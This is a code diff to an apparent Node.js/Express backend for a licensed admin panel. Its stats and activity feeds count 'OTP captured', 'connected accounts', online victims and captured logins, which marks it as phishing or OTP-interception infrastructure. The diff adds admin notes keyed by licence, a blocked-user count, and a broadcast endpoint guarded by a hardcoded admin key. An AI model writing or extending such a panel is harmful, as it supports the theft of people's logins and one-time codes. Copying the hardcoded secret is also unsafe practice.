@@ -61,9 +61,16 @@ const pendingMessageSchema = new mongoose.Schema({
     createdAt:   { type: Date, default: Date.now },
 });
 
+const noteSchema = new mongoose.Schema({
+    licenceKey: { type: String, required: true, unique: true, index: true },
+    note:       { type: String, default: '' },
+    updatedAt:  { type: Date,   default: Date.now },
+});
+
 const User           = mongoose.model('User',           userSchema);
 const License        = mongoose.model('License',        licenseSchema);
 const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);
+const Note           = mongoose.model('Note',           noteSchema);
 
 // ================== DB HELPERS ==================
 
@@ -131,15 +138,28 @@ async function dbFindUserByKey(licenceKey) {
 }
 
 async function dbGetStats() {
-    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses] = await Promise.all([
+    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers] = await Promise.all([
         User.countDocuments(),
         User.countDocuments({ status: 'Online' }),
         User.countDocuments({ otp: { $nin: [null, ''] } }),
         User.countDocuments({ connected: true }),
         License.countDocuments(),
         License.countDocuments({ status: 'Active' }),
+        User.countDocuments({ blocked: true }),
     ]);
-    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses };
+    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers };
+}
+
+async function dbSaveNote(licenceKey, note) {
+    await Note.findOneAndUpdate(
+        { licenceKey },
+        { note, updatedAt: new Date() },
+        { upsert: true, new: true }
+    );
+}
+
+async function dbGetNote(licenceKey) {
+    return await Note.findOne({ licenceKey }).lean();
 }
 
 async function dbGetAllLicenses() {
@@ -814,10 +834,11 @@ app.get('/api/stats', async (req, res) => {
             connectedAccounts: users.filter(u => u.connected).length,
             totalLicenses:     licenses.length,
             activeLicenses:    licenses.filter(l => l.status === 'Active').length,
+            blockedUsers:      users.filter(u => u.blocked).length,
         });
     } catch (e) {
         console.error('/api/stats error:', e.message);
-        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0 });
+        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0, blockedUsers: 0 });
     }
 });
 
@@ -851,6 +872,52 @@ app.get('/api/latest-activity', async (req, res) => {
         });
     } catch (e) {
         res.json({ logins: [], otps: [] });
+    }
+});
+
+// ================== BROADCAST MESSAGE ==================
+// Sends an admin message to ALL currently-connected SSE clients at once.
+app.post('/api/broadcast-message', (req, res) => {
+    const { message, type = 'info', adminKey } = req.body || {};
+    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
+    if (!message) return res.status(400).json({ error: 'message required' });
+    const payload = { type: 'broadcast_message', data: { message, type, timestamp: new Date().toISOString() } };
+    broadcastSSE(payload);
+    res.json({ ok: true, clients: sseClients.size });
+});
+
+// ================== USER NOTES ==================
+// Save an admin note for a user (keyed by licenceKey).
+app.post('/api/user-notes', async (req, res) => {
+    const { licenceKey, note } = req.body || {};
+    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
+    try {
+        if (useDatabase) {
+            await dbSaveNote(licenceKey, note || '');
+        } else {
+            // File-mode: store in an in-memory map (not persisted across restarts — MongoDB preferred)
+            if (!global._notesMap) global._notesMap = {};
+            global._notesMap[licenceKey] = { note: note || '', updatedAt: new Date().toISOString() };
+        }
+        res.json({ ok: true });
+    } catch (e) {
+        console.error('/api/user-notes POST error:', e.message);
+        res.status(500).json({ error: 'Server error' });
+    }
+});
+
+app.get('/api/user-notes/:licenceKey', async (req, res) => {
+    const { licenceKey } = req.params;
+    try {
+        if (useDatabase) {
+            const doc = await dbGetNote(licenceKey);
+            return res.json({ note: doc ? doc.note : '', updatedAt: doc ? doc.updatedAt : null });
+        } else {
+            const entry = (global._notesMap || {})[licenceKey];
+            return res.json({ note: entry ? entry.note : '', updatedAt: entry ? entry.updatedAt : null });
+        }
+    } catch (e) {
+        res.json({ note: '', updatedAt: null });
     }
 });
 
